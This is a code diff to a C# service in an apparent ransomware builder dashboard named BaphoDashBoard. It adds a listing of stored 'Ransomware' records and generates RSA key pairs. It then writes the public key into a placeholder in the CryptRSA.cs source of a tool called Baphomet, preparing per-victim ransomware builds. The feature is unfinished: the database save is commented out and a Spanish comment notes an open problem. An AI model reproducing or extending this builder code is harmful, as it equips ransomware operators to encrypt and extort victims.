@@ -1,5 +1,4 @@
 ﻿using BaphoDashBoard.Models;
-using BaphoDashBoard.VueModels;
 using Microsoft.EntityFrameworkCore;
 using System;
 using System.Collections.Generic;
@@ -9,6 +8,8 @@ using HtmlAgilityPack;
 using ScrapySharp.Extensions;
 using ScrapySharp.Network;
 using BaphoDashBoard.DTO;
+using BaphoDashBoard.ViewModels;
+using System.IO;
 
 namespace BaphoDashBoard.DAL.Services
 {
@@ -67,6 +68,27 @@ namespace BaphoDashBoard.DAL.Services
                 result.message = ex.Message;
             }
             return result;
+        }
+
+        public async Task<List<RansomDetailsViewModel>> GetRansomwareDetails()
+        {
+            List<RansomDetailsViewModel> ransomwaredetails = new List<RansomDetailsViewModel>();
+            try
+            {
+                ransomwaredetails = await _context.Ransomware.Select(x => new RansomDetailsViewModel()
+                {
+                    Name = x.Name,
+                    Description = x.Description,
+                    Date = x.ReleaseDate.ToShortDateString()
+
+                }).ToListAsync();
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+
+            }
+            return ransomwaredetails;
         }
 
         public async Task<DetailsViewModel> Details(int id)
@@ -148,6 +170,8 @@ namespace BaphoDashBoard.DAL.Services
                 model.HostsList.AddRange(model.Hosts.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                 var rsa_keys = GenerateRsaKeys();
 
+                var edit_ransomware = EditBaphometFiles(rsa_keys.PublicKey);
+
                 Ransomware ransomware = new Ransomware()
                 {
                     Name = model.Name,
@@ -156,8 +180,8 @@ namespace BaphoDashBoard.DAL.Services
                     PublicKey = rsa_keys.PublicKey,
                     PrivateKey = rsa_keys.PrivateKey
                 };
-                _context.Ransomware.Add(ransomware);
-                await _context.SaveChangesAsync();
+               // _context.Ransomware.Add(ransomware);
+              //  await _context.SaveChangesAsync();
             }
             catch(Exception ex)
             {
@@ -165,6 +189,57 @@ namespace BaphoDashBoard.DAL.Services
                 result.message = ex.Message;
             }
             return result;
+        }
+
+        public async Task<AppResult> EditBaphometFiles(string public_key)
+        {
+            AppResult result = new AppResult();
+            try
+            { 
+                var getpath = Directory.GetCurrentDirectory();
+                var main_path = getpath.Remove(getpath.Length - 15);
+                main_path = Path.Combine(main_path, "Tools","Baphomet");
+
+                var draw_rsa_key = DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", public_key, "<public key here>");
+
+            }
+            catch(Exception ex)
+            {
+                result.success = false;
+                result.message = ex.Message;
+            }
+            return result;
+        }
+
+        public async Task<AppResult> DrawParameters(string file_path, string file ,string parameter, string refence_value)
+        {
+            AppResult result = new AppResult();
+            try
+            {
+                var file_location = Path.Combine(file_path, file);
+                var file_content = File.ReadAllText(file_location);
+                file_content = file_content.Replace(refence_value, parameter);
+                File.WriteAllText(file_location, file_content);
+
+                //tengo un problem, como parametro recivo string o array, debo buscar la manera de dibujar linea por lines los array.
+
+                //string[] file_content = File.ReadAllLines(file_location);
+                //foreach(var line in file_content)
+                //{
+                //    if (line.Contains(refence_value))
+                //    {
+                //        var new_value = line.Replace(refence_value, parameter);
+                //        file_content
+                //    }
+                //}
+            }
+            catch (Exception ex)
+            {
+                result.success = false;
+                result.message = ex.Message;
+            }
+            return result;
+
         }
     }
 }
